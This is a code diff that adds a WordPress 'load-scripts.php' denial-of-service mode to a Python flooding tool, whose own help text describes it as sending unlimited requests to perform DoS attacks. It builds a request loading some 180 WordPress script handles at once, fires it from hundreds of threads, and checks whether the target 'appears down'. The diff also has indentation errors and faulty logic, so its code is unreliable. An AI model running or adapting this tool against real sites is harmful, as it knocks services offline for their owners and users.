@@ -4,11 +4,16 @@ import threading
 import random
 import re
 import argparse
-
+import coloredlogs, logging
+import eventlet
+eventlet.monkey_patch()
+#added timeout and basic color logging for messages
+load_time=0
 host=''
 headers_useragents=[]
 request_counter=0
 printedMsgs = []
+wp_scripts = ['eutil','common','wp-a11y','sack,quicktag','colorpicker','editor','wp-fullscreen-stu','wp-ajax-response','wp-api-request','wp-pointer','autosave','heartbeat','wp-auth-check','wp-lists','prototype','scriptaculous-root','scriptaculous-builder','scriptaculous-dragdrop','scriptaculous-effects','scriptaculous-slider','scriptaculous-sound','scriptaculous-controls','scriptaculous','cropper','jquery','jquery-core','jquery-migrate','jquery-ui-core','jquery-effects-core','jquery-effects-blind','jquery-effects-bounce','jquery-effects-clip','jquery-effects-drop','jquery-effects-explode','jquery-effects-fade','jquery-effects-fold','jquery-effects-highlight','jquery-effects-puff','jquery-effects-pulsate','jquery-effects-scale','jquery-effects-shake','jquery-effects-size','jquery-effects-slide','jquery-effects-transfer','jquery-ui-accordion','jquery-ui-autocomplete','jquery-ui-button','jquery-ui-datepicker','jquery-ui-dialog','jquery-ui-draggable','jquery-ui-droppable','jquery-ui-menu','jquery-ui-mouse','jquery-ui-position','jquery-ui-progressbar','jquery-ui-resizable','jquery-ui-selectable','jquery-ui-selectmenu','jquery-ui-slider','jquery-ui-sortable','jquery-ui-spinner','jquery-ui-tabs','jquery-ui-tooltip','jquery-ui-widget','jquery-form','jquery-color,schedule','jquery-query','jquery-serialize-object','jquery-hotkeys','jquery-table-hotkeys','jquery-touch-punch','suggest','imagesloaded','masonry','jquery-masonry','thickbox','jcrop','swfobject','moxiejs','plupload','plupload-handlers','wp-plupload','swfupload','swfupload-all','swfupload-handlers','comment-repl','json2','underscore','backbone','wp-util','wp-sanitize','wp-backbone','revisions','imgareaselect','mediaelement','mediaelement-core','mediaelement-migrat','mediaelement-vimeo','wp-mediaelement','wp-codemirror','csslint','jshint','esprima','jsonlint','htmlhint','htmlhint-kses','code-editor','wp-theme-plugin-editor','wp-playlist','zxcvbn-async','password-strength-meter','user-profile','language-chooser','user-suggest','admin-ba','wplink','wpdialogs','word-coun','media-upload','hoverIntent','customize-base','customize-loader','customize-preview','customize-models','customize-views','customize-controls','customize-selective-refresh','customize-widgets','customize-preview-widgets','customize-nav-menus','customize-preview-nav-menus','wp-custom-header','accordion','shortcode','media-models','wp-embe','media-views','media-editor','media-audiovideo','mce-view','wp-api','admin-tags','admin-comments','xfn','postbox','tags-box','tags-suggest','post','editor-expand,link','comment','admin-gallery','admin-widgets','media-widgets','media-audio-widget','media-image-widget','media-gallery-widget','media-video-widget','text-widgets','custom-html-widgets','theme','inline-edit-post','inline-edit-tax','plugin-install','updates','farbtastic','iris','wp-color-picker','dashboard','list-revision','media-grid','media','image-edit','set-post-thumbnail','nav-menu','custom-header','custom-background','media-gallery','svg-painter']
 
 def printMsg(msg):
 	if msg not in printedMsgs:
@@ -68,12 +73,13 @@ def sendGET(url):
 	global request_counter
 	headers = initHeaders()
 	try:
-		request_counter+=1
-		request = requests.get(url, headers=headers)
+            with eventlet.Timeout(10):
+		 request_counter+=1
+		 request = requests.get(url, headers=headers)
 		# print 'her'
-		handleStatusCodes(request.status_code)
+	         handleStatusCodes(request.status_code)
 	except:
-		pass
+              pass
 
 def sendPOST(url, payload):
 	global request_counter
@@ -97,6 +103,8 @@ class SendGETThread(threading.Thread):
 		except:
 			pass
 
+
+
 class SendPOSTThread(threading.Thread):
 	def run(self):
 		try:
@@ -105,8 +113,20 @@ class SendPOSTThread(threading.Thread):
 				sendPOST(url, payload)
 		except:
 			pass
+#added for future and current modules to allow for response time skew testing
+def  get_baseline_response(url):
+     timer = requests.get(url).elapsed.total_seconds()
+     return timer
 
-
+    
+def chk_down(url,load_time):
+    try:
+       timer = requests.get(url).elapsed.total_seconds()
+       if load_time <= timer:
+          return load_time - timer
+    except:
+          if timer > load_time :
+             return "site appears effected"
 # TODO:
 # check if the site stop responding and alert
 
@@ -114,6 +134,7 @@ def main(argv):
 	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
 	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
 	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
+	parser.add_argument('-wpd', help='Specify if wordpress Dos is used Default 500 Requests -wpd true')
 	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
 	parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
 	parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
@@ -122,9 +143,18 @@ def main(argv):
 	global url, payload, additionalHeaders
 	additionalHeaders = args.ah
 	payload = args.d
-
-	if args.g:
+        
+	if args.g and args.wpd:
 		url = args.g
+		host = url + '/wp-admin/load-scripts.php?c=1&load%5B%5D='+ format(wp_scripts)
+		load_time = get_baseline_response(url)
+		logger = logging.getLogger(url)
+                coloredlogs.install(level='DEBUG', logger=logger)
+                logger.info("displaying attack script count")
+                logger.info(len(wp_scripts))
+		logger.warning("Baseline Response Time:" + format(load_time))
+		print host
+		
 		for i in range(args.t):
 			t = SendGETThread()
 			t.start()
@@ -138,6 +168,13 @@ def main(argv):
 	if len(sys.argv)==1:
 		parser.print_help()
 		exit()
+	attack_rezult = chk_down(host,load_time)
+	try:
+	   if "site appears effected" in attack_rezult:
+              logger.critical("Host Appears Down")
+              return attack_rezult
+        except:
+            return "awake and alive"
 	
 if __name__ == "__main__":
    main(sys.argv[1:])
